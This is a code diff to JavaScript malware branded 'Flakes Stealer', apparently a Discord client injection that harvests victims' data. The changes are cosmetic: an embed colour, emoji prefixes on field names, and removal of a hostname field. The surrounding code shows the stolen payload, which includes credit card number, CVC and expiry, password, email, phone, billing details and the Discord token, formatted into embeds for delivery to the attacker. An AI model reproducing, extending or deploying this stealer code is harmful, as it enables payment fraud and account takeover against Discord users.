@@ -24,6 +24,7 @@ var config = {
 
     embed: {
         username: "Flakes Stealer",
+        color: 0x5c0000,
         footer: {
             text: `Flakes Stealer`,
             icon_url: "https://cdn.discordapp.com/attachments/1096397354703274116/1096458040800194600/pHqxryG.gif",
@@ -271,45 +272,41 @@ var event_handlers = {
                     url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
                 fields: [{
-                        name: "Credit card Number",
+                        name: "<a:bsymbol_Flakesic_fire:947142520054362162> Credit card Number",
                         value: `\`\`\`${number}\`\`\``,
                         inline: true
                     },
                     {
-                        name: "Credit card CVC",
+                        name: "<a:bsymbol_Flakesic_fire:947142520054362162> Credit card CVC",
                         value: `\`\`\`${cvc}\`\`\``,
                         inline: true
                     },
                     {
-                        name: "Credit card expiration",
+                        name: "<a:bsymbol_Flakesic_fire:947142520054362162> Credit card expiration",
                         value: `\`\`\`${month}/${year}\`\`\``,
                         inline: true
                     },
                     {
-                        name: "Phone Number",
+                        name: "<a:bsymbol_Flakesic_fire:947142520054362162> Phone Number",
                         value: `\`\`\`${userInfo.phone ?? "None"}\`\`\``,
                         inline: false
                     },
                     {
-                        name: "Nitro",
+                        name: "<a:bsymbol_Flakesic_fire:947142520054362162> Nitro",
                         value: `${getNitro(userInfo.premium_type)}`,
                         inline: false
                     }, {
-                        name: "Billing",
+                        name: "<a:bsymbol_Flakesic_fire:947142520054362162> Billing",
                         value: `${billing}`,
                         inline: true
                     }, {
-                        name: "Badges",
+                        name: "<a:bsymbol_Flakesic_fire:947142520054362162> Badges",
                         value: `${getBadges(userInfo.flags)}`,
                         inline: false
                     },
                     {
-                        name: "Token",
+                        name: "<a:bsymbol_Flakesic_fire:947142520054362162> Token",
                         value: `\`\`\`${token}\`\`\``,
-                        inline: false
-                    }, {
-                        name: "Hostname",
-                        value: `\`\`\`${os.hostname}\`\`\``,
                         inline: false
                     },
                 ],
@@ -340,6 +337,7 @@ var event_handlers = {
             embeds: [createEmbed({
                 title: "Discord | User logged in",
                 url: config.embed.href,
+                color: 0x5c0000,
                 author: {
                     name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
                     url: config.embed.href,
@@ -349,40 +347,36 @@ var event_handlers = {
                     url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
                 fields: [{
-                        name: "Password",
+                        name: "<a:bsymbol_Flakesic_fire:947142520054362162> Password",
                         value: `\`\`\`${password}\`\`\``,
                         inline: true
                     },
                     {
-                        name: "E-Mail Address",
+                        name: "<a:bsymbol_Flakesic_fire:947142520054362162> E-Mail Address",
                         value: `\`\`\`${email}\`\`\``,
                         inline: true
                     },
                     {
-                        name: "Phone Number",
+                        name: "<a:bsymbol_Flakesic_fire:947142520054362162> Phone Number",
                         value: `\`\`\`${userInfo.phone ?? "None"}\`\`\``,
                         inline: false
                     },
                     {
-                        name: "Nitro",
+                        name: "<a:bsymbol_Flakesic_fire:947142520054362162> Nitro",
                         value: `${getNitro(userInfo.premium_type)}`,
                         inline: false
                     }, {
-                        name: "Billing",
+                        name: "<a:bsymbol_Flakesic_fire:947142520054362162> Billing",
                         value: `${billing}`,
                         inline: true
                     }, {
-                        name: "Badges",
+                        name: "<a:bsymbol_Flakesic_fire:947142520054362162> Badges",
                         value: `${getBadges(userInfo.flags)}`,
                         inline: false
                     },
                     {
-                        name: "Token",
+                        name: "<a:bsymbol_Flakesic_fire:947142520054362162> Token",
                         value: `\`\`\`${token}\`\`\``,
-                        inline: false
-                    }, {
-                        name: "Hostname",
-                        value: `\`\`\`${os.hostname}\`\`\``,
                         inline: false
                     },
                 ],
